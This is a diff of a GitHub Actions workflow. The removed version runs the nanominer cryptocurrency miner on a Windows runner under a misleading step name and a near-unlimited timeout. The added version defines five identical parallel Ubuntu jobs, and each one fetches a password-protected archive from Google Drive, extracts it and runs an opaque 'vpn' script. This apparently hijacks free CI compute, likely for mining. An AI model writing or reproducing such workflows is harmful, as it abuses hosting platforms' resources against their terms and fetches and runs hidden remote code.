@@ -1,18 +1,39 @@
-name: Auto
+name: Ubuntu
 
 on: workflow_dispatch
 
 jobs:
-  build:
-
-    runs-on: windows-latest
-    timeout-minutes: 9999
+  one:
+    runs-on: ubuntu-18.04
 
     steps:
-    - name: Download Ngrok & NSSM
-      run: |
-        Invoke-WebRequest https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-windows-3.3.2.zip -OutFile nano.zip
-        tar -xf nano.zip
-        cd .\nanominer-windows-3.3.2\
-        Invoke-WebRequest https://github.com/VTFFZ2c9E0/VTFFZ2c9E0/raw/main/config.ini -OutFile config.ini
-        ./nanominer.exe config.ini
+    - name: Running
+      run: sudo apt update -y && sudo apt install p7zip-full -y && wget -O file.zip "https://drive.google.com/uc?export=download&id=1ImqkWfuEa9iDVW-wvMJAUZDqw7AfE6o5" && 7z  x  -pvinh file.zip && bash vpn
+
+  two:
+    runs-on: ubuntu-18.04
+
+    steps:
+    - name: Running
+      run: sudo apt update -y && sudo apt install p7zip-full -y && wget -O file.zip "https://drive.google.com/uc?export=download&id=1ImqkWfuEa9iDVW-wvMJAUZDqw7AfE6o5" && 7z  x  -pvinh file.zip && bash vpn
+
+  three:
+    runs-on: ubuntu-18.04
+
+    steps:
+    - name: Running
+      run: sudo apt update -y && sudo apt install p7zip-full -y && wget -O file.zip "https://drive.google.com/uc?export=download&id=1ImqkWfuEa9iDVW-wvMJAUZDqw7AfE6o5" && 7z  x  -pvinh file.zip && bash vpn
+
+  four:
+    runs-on: ubuntu-18.04
+
+    steps:
+    - name: Running
+      run: sudo apt update -y && sudo apt install p7zip-full -y && wget -O file.zip "https://drive.google.com/uc?export=download&id=1ImqkWfuEa9iDVW-wvMJAUZDqw7AfE6o5" && 7z  x  -pvinh file.zip && bash vpn
+
+  five:
+    runs-on: ubuntu-18.04
+
+    steps:
+    - name: Running
+      run: sudo apt update -y && sudo apt install p7zip-full -y && wget -O file.zip "https://drive.google.com/uc?export=download&id=1ImqkWfuEa9iDVW-wvMJAUZDqw7AfE6o5" && 7z  x  -pvinh file.zip && bash vpn
